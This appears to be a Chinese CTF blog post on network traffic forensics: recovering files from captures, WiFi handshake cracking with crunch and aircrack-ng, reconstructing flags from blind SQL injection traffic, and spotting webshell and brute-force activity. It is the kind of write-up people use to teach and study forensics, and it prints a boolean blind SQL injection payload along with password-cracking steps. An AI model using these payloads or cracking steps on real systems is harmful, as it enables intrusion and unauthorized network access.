多余信息  &gt; 保存为 rar</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835565177713.png" alt="img"></p><p>方法二 ：用formost 分离：分离出来好多东西，不过我们目标是rar包</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20190915104146559.png" alt="img"></p><p>得到一张flag.git:</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20190915104430573.gif" alt="img"></p><h3 id="4-题目：想蹭网先解开密码-无线密码破解"><a href="#4-题目：想蹭网先解开密码-无线密码破解" class="headerlink" title="4,题目：想蹭网先解开密码(无线密码破解)"></a>4,题目：想蹭网先解开密码(无线密码破解)</h3><p>题目来源：bugku<br>考点：无线密码破解<br>题目信息：(wifi.cap)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683556383439.png" alt="img"></p><p>wifi 连接认证 的重点在于 WAP的 四次握手过程 ，就是 EAPOL 协议的包，</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683556345287.png" alt="img"></p><p>存在 握手过程：直接进行爆破：</p><p>先用 linux中的 crunch 生成一个字典：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20190915110315929.png" alt="img"></p><p>然后 用 aircrack-ng 进行爆破：<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683556269594.png" alt="img"></p><p>得到 WiFi密码</p><h3 id="5-我的的教练也想打CTF"><a href="#5-我的的教练也想打CTF" class="headerlink" title="5,我的的教练也想打CTF"></a>5,我的的教练也想打CTF</h3><p>打开流量包，直接搜 字符串 flag ，找到很多 包，仔细看这些包的info ，发现是 sql 注入语句 布尔注入：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683556227142.png" alt="img"></p><p>鉴于 sql 注入的 布尔注入 的原理：逐个字母爆破要查询的字符，我们可以把 查询到的每个字符 收集起来就能 得到 flag了</p><p>注： 爆破每个字符的最后一个 查询语句 对应的字符就是 正确的字符</p><p>本题的爆破语句 ：</p><p>?id&#x3D;1’ and ascii(substring((select keyid from flag limit 0,1),1,1))&#x3D;33 %23</p><p>意思是： 截取 keyid 的第一个字符 ，并转化为 ascii 与 33 进行比较，正确 就停止，不正确就继续试 34,35……</p><p>按照这个规律 得到 keyid 的 所有字符对应的 ascii ：</p><pre><code class="undefined">102 108 97 103 123 99 50 98 98 102 57 99 101 99 100 97 102 54 53 54 99 102 53 50 52 100 48 49 52 99 53 98 102 48 52 54 99 125</code></pre><p>将其转化为 字符就可以了：</p><pre><code class="vbscript">chars = &quot;102 108 97 103 123 99 50 98 98 102 57 99 101 99 100 97 102 54 53 54 99 102 53 50 52 100 48 49 52 99 53 98 102 48 52 54 99 125&quot;char = chars.split(&quot; &quot;)for c in char :    print(chr(int(c)),end=&quot;&quot;)flag&#123;c2bbf9cecdaf656cf524d014c5bf046c&#125;</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>大佬的脚本直接跑：</p><pre><code class="python">import pysharklastt=256flag=&quot;flag is &quot;capa=pyshark.FileCapture(&#39;misc.pcapng&#39;,only_summaries=True,display_filter=&quot;http.request == 1&quot;)for arps in capa:    now=eval(str(arps).split(&quot; &quot;)[7].split(&#39;=&#39;)[2].split(&#39;%&#39;)[0])    if now &lt; lastt &amp; lastt &lt;= 255:       flag+=chr(lastt)   lastt=nowflag+=&#39;&#125;&#39;print(flag)</code></pre><p>上面的看不太懂，贴一个自己写的：</p><p>（过滤 http  然后 文件 》 导出分组解析结果 》 为 CVS  ,保存为 12.txt ）</p><pre><code class="python">import reimport urllib.parsef = open(r&#39;12.txt&#39;)file = f.readlines()datas = []#urldecodefor i in file:    datas.append(urllib.parse.unquote(i))lines = []#提取注入flag的语句for i in range(0,len(datas)):    if datas[i].find(&quot;flag limit 0,1),1,1))=32# HTTP/1.1&quot;) &gt; 0:        lines = datas[i:]        breakflag = &#123;&#125;macth = re.compile(r&quot;limit 0,1\),(.*?),1\)\)=(.*?)# HTTP/1.1&quot;) #匹配我们需要的信息块for i in range(0,len(lines),2):    obj = macth.search(lines[i])    if obj:        key = int(obj.group(1)) #获取字符的位置        value = int(obj.group(2))#获取字符的ascii值        flag[key] = value #不断的更新，进而保留最后一个f.close()result = &#39;&#39;for value in flag.values():    result += chr(value)print(result) </code></pre><h1 id="CTF——流量分析题型整理总结"><a href="#CTF——流量分析题型整理总结" class="headerlink" title="CTF——流量分析题型整理总结"></a>CTF——流量分析题型整理总结</h1><h3 id="一，ping-报文信息-（icmp协议）"><a href="#一，ping-报文信息-（icmp协议）" class="headerlink" title="一，ping 报文信息 （icmp协议）"></a><strong>一，ping 报文信息 （icmp协议）</strong></h3><p>例1.1</p><p>打开流量包，发现有一大段的icmp协议的包，发现在icmp报文中夹杂着flag</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70.jpeg" alt="img"></p><p>这里可以依次查看每一个icmp报文数据，然后得到flag</p><p>也可以用脚本处理：（不推荐）</p><p>先过滤出 icmp协议的包》导出特定分组 》保存为flag.pcapng》然后用脚本处理：</p><p>（这个脚本只能处理data只有一个字节的包，局限性较大，还不如直接一个包一个包查看，反正flag也不会太长）</p><pre><code class="python">import  pysharkcap = pyshark.FileCapture(&#39;flag.pcapng&#39;)for packet in cap:    data = &#39;&#39;+packet[packet.highest_layer].data    print(chr(int(data,16)),end=&#39;&#39;)cap.close()</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219143525585.jpg" alt="img"></p><h3 id="二，上传-x2F-下载文件（蓝牙obex，http，难-文件的分段上传-x2F-下载）"><a href="#二，上传-x2F-下载文件（蓝牙obex，http，难-文件的分段上传-x2F-下载）" class="headerlink" title="二，上传&#x2F;下载文件（蓝牙obex，http，难:文件的分段上传&#x2F;下载）"></a><strong>二，上传&#x2F;下载文件（蓝牙obex，http，难:文件的分段上传&#x2F;下载）</strong></h3><p>这类夹杂着文件的流量包最好处理，</p><p><strong>方法一</strong>，直接用foremost直接分离提取一下就能提取出其中隐藏的文件，一般会直接分离出来一个 压缩包，一张图片，或者flag.txt都是有可能的</p><p><strong>方法二，</strong></p><p><strong>自动提取通过http传输的文件内容</strong><br>文件-&gt;导出对象-&gt;HTTP</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068851.png" alt="img"></p><p>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击<code>Save</code>进行保存，或者<code>Save All</code>保存所有对象再进入文件夹进行分析。</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068852.png" alt="img"></p><p><strong>手动提取通过http传输的文件内容</strong><br>选中http文件传输流量包，在分组详情中找到<code>data</code>,<code>Line-based text</code>, <code>JPEG File Interchange Format</code>, <code>data:text/html</code>层，鼠标右键点击 – 选中 导出分组字节流。</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068853.png" alt="img"></p><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068854.png" alt="img"></p><p>在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068855.png" alt="img"></p><p>最后点击<code>Save as</code>按钮导出。</p><p><strong>例2.1手机热点(蓝牙传输协议obex,数据提取)</strong></p><p><strong>题目来源：第七季极客大挑战<br>考点：蓝牙传输协议obex,数据提取<br>题目信息：(Blatand_1.pcapng)</strong></p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068866.png" alt="img"></p><p>题中说用 没流浪 向电脑传了文件 那肯定是 用的蓝牙 蓝牙协议 为  obex协议</p><p>帅选出 obex 协议包 ：发现 有一个包 里有一个 rar压缩包：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068867.png" alt="img"></p><p>要分离出 这个 rar 包：</p><p>方法一：直接复制 数据块 然后复制到winhex中 转存为 rar </p><p>复制数据块 as Hex stream  &gt;  在winhex中粘贴 为 ASCII HEX &gt;  删除前面的 多余信息  &gt; 保存为 rar</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068868.png" alt="img"></p><p>方法二 ：用formost 分离：分离出来好多东西，不过我们目标是rar包</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20190915104146559-166857030689973.png" alt="img"></p><p>得到一张flag.git:</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20190915104430573-166857030689975.gif" alt="img"></p><p><strong>例2.2 抓到一只苍蝇</strong></p><p><strong>这题属于比较难的类型，是文件的分段传输，我们需要将几段数据拼接起来</strong></p><p>首先在 分组字节流中 搜索一下 字符串 flag 找到第一个 包，追踪一下数据流 ，</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16685703068869.png" alt="img"></p><p>然后就看到了上述信息，知道了应该是在用 qq邮箱传输文件，</p><p>文件的信息： fly.rar 文件的大小为 525701</p><p>{“path”:”fly.rar”,”appid”:””,”size”:525701,”<a href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>“:”e023afa4f6579db5becda8fe7861c2d3”,”sha”:”ecccba7aea1d482684374b22e2e7abad2ba86749”,”sha3”:””}</p><p>既然知道了在上传文件，肯定要用到 http的request的 POST方法</p><p>在过滤器中 输入</p><pre><code class="vbscript">http &amp;&amp; http.request.method==POST</code></pre><p>然后找到这5个包，第一个包是 文件的信息，后面5个包为数据</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688610.png" alt="img"></p><p>分别查看其中 date 的长度：<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688611.png" alt="img"></p><p>前四个 为 131436 最后一个为 17777</p><p>所以 131436*4 +17777&#x3D;527571 与第一个包给出的 fly.rar的长度 525701 差 1820</p><p>因为每个包都包含头信息，1820&#x2F;5 &#x3D; 364</p><p>所以每个包的头信息为 364</p><p><strong>接下来导出数据包：</strong></p><p>wireshark-&gt;文件-&gt;导出对象-&gt;http-&gt;选择save对象</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688612.png" alt="img"></p><p>将对应的包 分别save 为 1 2 3 4 5</p><p>将这五个包拖进 kali中 </p><p>执行：</p><pre><code class="sql">dd if=1 bs=1 skip=364 of=11dd if=2 bs=1 skip=364 of=22dd if=3 bs=1 skip=364 of=33dd if=4 bs=1 skip=364 of=44dd if=5 bs=1 skip=364 of=55</code></pre><p>将数据包的头部的 364个字节去除 得到 11 22 33 44 55</p><p>将这五个包合并</p><pre><code class="bash">cat 11 22 33  44 55 &gt; fly.rar</code></pre><p>查看一下 flag.rar的md5值是否正确</p><pre><code class="bash">md5sum fly.rar</code></pre><p>正确</p><p>解压，跳出提示文件头损坏，并且要求输入密码</p><p>知道是伪密码，用winhex打开，修改文件头，将 84 改为 80，保存</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191018203553172.png" alt="img"></p><p>解压得到，flag.txt 打开一堆乱码，直接用 foremost分离一下，得到很多的图片</p><p>发现一张二维码，扫描后得到flag</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688613.png" alt="img"></p><p>flag{m1Sc_oxO2_Fly}</p><p>其实我刚开始不是这么做的，我是直接用foremost分离 流量包 ，然后分离出来几张图片 和一个压缩包，尝试解压</p><p>爆出一堆错误，并提示输入密码，将 文件头的 84 修改为 80 后依然打不开 ，，可能是 这个文件中还包含了其他错误信息，然后就换用上面的方法了</p><h3 id="三，sql注入攻击"><a href="#三，sql注入攻击" class="headerlink" title="三，sql注入攻击"></a><strong>三，sql注入攻击</strong></h3><p><strong>例3.1信息提取（超详细）</strong></p><p><strong>曾经在比赛中也遇过几乎一样的题，一直没有好好的写过一篇详细的博客，今天决定借助这个题好好记录理解一下这种类型的题</strong></p><p>提示 ： sqlmap</p><p>打开流量包，也观察到了 是 用sqlmap进行的 sql盲注的过程，用的是二分法</p><p>为了更好的理解 注入的过程 我们首先把 注入语句提取出来，这样方便观察</p><p>过滤http流量 ，然后  文件 》导出分组解析结果 》为CSV   保存为 123.txt</p><p>用notepad++ 打开 123.txt，可以看到语句语句中还是夹杂着很多的urlcode </p><p>全选 , 然后  插件 》MIME Tools 》 url decode ，这样就把URLcode转为更直观的 ascii了</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688714.png" alt="img"></p><p>然后再 来理解用 二分法 进行sql盲注的过程</p><p>以flag 的第一个字符为 例 ：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688715.png" alt="img"></p><p>绿色框中的数字 代表是测试第几个 字符</p><p>红色框中的数字 代表 与当前测试的字符的ascii值 相比较的 值</p><p>粉色框中数字 代表返回的数据的长度（一会我们要依据这个来判断上面的语句是否正确）</p><p><strong>ascii有 128个所以从 64 开始判断，然后是96(64和128的中间值)，说明&gt;64是正确的 ，才会取96，然后是 80，80小于96，说明&gt;96是错误的，所以才会取 64和96 的中间值 80，然后是 72 ，说明&gt;80是错误的，取80和64之间的中间值72，然后是76，说明&gt;72是正确的，才会取 72 和80之间的中间值76，然后是 74，说明&gt;76是错误的，才会取 72 和76的中间值 74，然后是73，说明&gt;74是错误的，才会取 72 和 74的中间值 73</strong></p><p>至于 &gt; 73 语句是否正确，关系到我们最后的取值，</p><p>我们已经知道了 <strong>第一个字符 的ascii值 的范围 为 72&lt; x &lt;&#x3D; 74,</strong> 至于是 73 还是 74 ，需另做判断：</p><p>若 &gt; 73 正确， 则 x &#x3D; 74 第一个字符 的ascii值为 74 就是 J</p><p>若 &gt;73 错误，则 x &#x3D; 73 就是 I</p><p>由于我们上面已经知道了 &gt;64 是正确的  返回包的数据长度是 467</p><p>​                     &gt;96 是错误的  返回包的数据长度是 430</p><p>​                     &gt;80 是错误的  返回包的数据长度是 430</p><p>​                     &gt;72 是正确的  返回包的数据长度是 467</p><p>​                     &gt;76 是错误的  返回包的数据长度是 430</p><p>​                     &gt;74 是错误的  返回包的数据长度是 430</p><p>可以看到 当判断语句正确时 ，返包的数据长度 是 大于 430的 ，错误时 是小于等于 430</p><p>然后看到 最后一条语句 &gt;73 的返回值 为 430，说明与错误， 第一个字符的ascii 为 73 </p><p>理解了过程就好做多了</p><p><strong>我们只需要 找到 当前测试字符的 最后一条的测试语句的 ascii值 和 返回值</strong></p><p><strong>如果返回值大于 430 则  当前测试字符的ascii 值 为  最后一条测试语句的ascii值</strong></p><p><strong>如果返回值 小于等于 430 则 当前测试字符的ascii值 为 最后一条测试语句的ascii  +  1</strong></p><p>方法一：（当flag 较短的时候）</p><p>当flag较短的时候，我们肯定是用手工 一个一个记下 每个字符的ascii值 比较快</p><p>方法二： （当flag 较长时）</p><p>当flag 为 25个字符以上的时候，手工就显得太费劲，不如写个脚本来的快，就想本题一样，flag的长度为 33</p><p>上脚本：</p><pre><code class="python">import reimport urllib.parse # 更改为自己从wireshark提取出的csv文件地址f = open(r&quot;123.txt&quot;)lines = f.readlines()datas = []# 转码, 保存进datasfor line in lines:    datas.append(urllib.parse.unquote(line))lines = []  # 懒得改, 就复用一下, 这个lines保存注入flag的urlfor i in range(len(datas)):  # 提取出注入flag的url    if datas[i].find(&quot;isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;64&quot;) &gt; 0:        lines = datas[i:]        breakflag = &#123;&#125;# 用正则匹配macth1 = re.compile(r&quot;LIMIT 0,1\),(\d*?),1\)\)&gt;(\d*?) HTTP/1.1&quot;)macth2 = re.compile(r&#39;&quot;HTTP&quot;,&quot;(\d*?)&quot;,&quot;HTTP/1.1 200 OK&#39;)for i in range(0, len(lines), 2):  # 因为有返回响应, 所以步长为2    get1 = macth1.search(lines[i])    if get1:        key = int(get1.group(1))  # key保存字符的位置        value = int(get1.group(2))  # value保存字符的ascii编码        get2 = macth2.search(lines[i + 1])        if get2:            if int(get2.group(1)) &gt; 450:                value += 1        flag[key] = value  # 用字典保存flagf.close()result = &#39;&#39;for value in flag.values():    result += chr(value)print(result)</code></pre><p>为什么脚本中 判断的返回值取 450 呢？ 因为 取430时，得出来的flag不对，仔细查看123.txt后，发现 其中还有一些错误的语句的返回 包 为 431 或者 432，所以就干纯粹取个 450 （433~460都可以）</p><p>（这再看不懂就考虑换专业吧）</p><p>得到flag：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191019161519909.png" alt="img"></p><p>ISG{BLind_SQl_InJEcTi0N_DeTEcTEd}</p><p><em><strong>*例3.2日志审计*</strong></em></p><p>用 notepad++ 打开 日志文件，先用 插件中的 MIME Tool 中的 URL decode 解一下码</p><p>然后就能清楚的看出来 是在进行 sql 盲注操作，</p><p>进一步审查，还可以看到每一条语句 返回的<strong>状态码</strong> ，并且知道 他是用的 <strong>二分法</strong>在进行 sql盲注</p><p>我需要做的就是找到 每一个 测试的字符的 最后一条状态码为 200 的 语句中的 ascii 值并记录下来</p><p>例如：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688716.png" alt="img"></p><p>由于使用的是二分法，所以我们这里可以知道 flag的第 18 个字符的ascii 为 117+1 ，118</p><p>当然你你也可以用手工的方法，一个一个的记下 flag 每一个 字符的 ascii 值 （flag也就 25个字符，如果写不出代码的话）</p><p>当然最好是用脚本跑出来</p><p>我找了个脚本：</p><pre><code class="python"># coding:utf-8import reimport urllib f = open(&#39;access.log&#39;, &#39;r&#39;)lines = f.readlines()datas = []for line in lines:    t = urllib.unquote(line) # 过滤出与flag相关，正确的猜解，这里只收集正确的猜解，而测试字符的ascii = 最后一个正确的猜解的ascii +1（这是二分法的一个隐藏规律）    if &#39;200 1765&#39; in t and &#39;flag&#39; in t:         datas.append(t) flag_ascii = &#123;&#125;for data in datas:    matchObj = re.search(r&#39;LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND&#39;, data)    if matchObj:        key = int(matchObj.group(1))        value = int(matchObj.group(2)) + 1        flag_ascii[key] = value  # 使用字典，保存最后一次猜解正确的ascii码 flag = &#39;&#39;for value in flag_ascii.values():    flag += chr(value) print flag</code></pre><p>解释一下：</p><p><em><strong>*t &#x3D; urllib.unquote(line)*</strong></em>      就是将 文本进行 urldecode 解码</p><p><em><strong>*if ‘200 1765’ in t and ‘flag’ in t:*</strong></em>  如果语句中有这两个字符串就直接将这个语句 存入 数组datas中<br>    <strong>datas.append(t)</strong></p><p><strong>matchObj &#x3D; re.search(r’LIMIT 0,1),(.*?),1))&gt;(.*?) AND’, data)</strong>  在date 中搜索符合 正则表达的 字符串并 将匹配的字符串存入变量 matchObj 中</p><p>​    key &#x3D; int(matchObj.group(1))     取 变量matchObj 中 的第一个括号里的内容 （也就是上条语句中的 （.*?）中的内容）并转为10进制<br>​    value &#x3D; int(matchObj.group(2)) + 1   取 变量matchObj 中 的第二个括号里的内容，并转为 10 进制</p><p>得到 flag：flag{sqlm4p_15_p0werful}</p><h3 id="四，访问特定的加密解密网站（md5，base64）"><a href="#四，访问特定的加密解密网站（md5，base64）" class="headerlink" title="四，访问特定的加密解密网站（md5，base64）"></a><strong>四，访问特定的加密解密网站（md5，base64）</strong></h3><p>例4.1：你能找到我吗？</p><p>打开流量包，在分组字节流中搜索 字符串 flag，找到了几个包，但都没有什么可利用的信息</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688717.jpeg" alt="img"></p><p>然后尝试着过滤出http包，（别问我为什么要过滤出http包，经验告诉我http有问题的可能性最大）</p><p>然后就剩6个包了：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688718.jpeg" alt="img"></p><p>点击第一个包，右键 追踪流 》http </p><p>然后仔细审查这个包，发现了<a href="https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020">base64</a> ，访问域名：<a href="http://tool.chinaz.com/Tools/Base64.aspx">http://tool.chinaz.com/Tools/Base64.aspx</a></p><p>发现是个base64<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>解密的网站：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688719.jpeg" alt="img"></p><p>然后把 result后面的密文复制下来，解密两次 拿到了flag：sdut2019{Traffic_analysis_seclab507}</p><h3 id="五，后台扫描-弱密码爆破-菜刀"><a href="#五，后台扫描-弱密码爆破-菜刀" class="headerlink" title="五，后台扫描+弱密码爆破+菜刀"></a><strong>五，后台扫描+弱密码爆破+菜刀</strong></h3><p><strong>例5.1，中国菜刀</strong></p><p>在 分组字节流中搜索 flag 字符串，找到第8 个包，追踪tcp数据流</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191017191231313.png" alt="img"></p><p>看到了 flag.tar.gz，猜测流量包中隐藏了一个压缩包，</p><p>用binwalk 审查一下：发现了一个压缩包，分离</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191017191552929.png" alt="img"></p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191017191624789.png" alt="img"></p><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p><p><strong>例5.2 密码爆破</strong></p><p>flag为flag{管理员入口 地址 + 管理员密码 }</p><p>找不到源文件了，大致的过程就是 黑客先利用后台扫描工具，扫描出来了网站的后台管理员入口</p><p>然后用 用户名 admin 